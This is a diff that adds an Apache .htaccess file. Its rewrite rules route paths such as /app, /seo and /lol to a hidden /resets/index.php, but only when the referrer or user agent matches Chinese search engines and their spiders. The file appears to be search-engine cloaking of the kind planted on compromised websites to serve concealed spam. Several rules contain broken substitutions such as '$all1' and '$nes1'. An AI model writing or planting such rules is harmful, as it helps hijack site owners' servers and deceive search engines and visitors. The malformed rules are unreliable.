@@ -1,0 +1,51 @@
+RewriteEngine on
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^app(.*)$ /resets/index.php?app$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^app(.*)$ /resets/index.php?$1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^wsp(.*)$ /resets/index.php?wsp$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^wsp(.*)$ /resets/index.php?wsp$1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^ssp(.*)$ /resets/index.php?ssp$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^ssp(.*)$ /resets/index.php?ssp$1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^seo(.*)$ /resets/index.php?seo$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^seo(.*)$ /resets/index.php?seo$1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^tab(.*)$ /resets/index.php?tab$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^tab(.*)$ /resets/index.php?tab$1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^all(.*)$ /resets/index.php?all$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^all(.*)$ /resets/index.php?$all1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^lpl(.*)$ /resets/index.php?lpl$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^lpl(.*)$ /resets/index.php?lpl$1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^lol(.*)$ /resets/index.php?lol$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^lol(.*)$ /resets/index.php?lol$1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^nes(.*)$ /resets/index.php?nes$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^nes(.*)$ /resets/index.php?$nes1 [QSA,NC,L]
+
+RewriteCond %{HTTP_REFERER} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^tgb(.*)$ /resets/index.php?tgb$1 [QSA,NC,L] 
+RewriteCond %{HTTP:User-Agent} (baidu|so|sogou|360|sm|UCBrowser|haosou|YisouSpider) [NC]  
+RewriteRule ^tgb(.*)$ /resets/index.php?$tgb1 [QSA,NC,L]
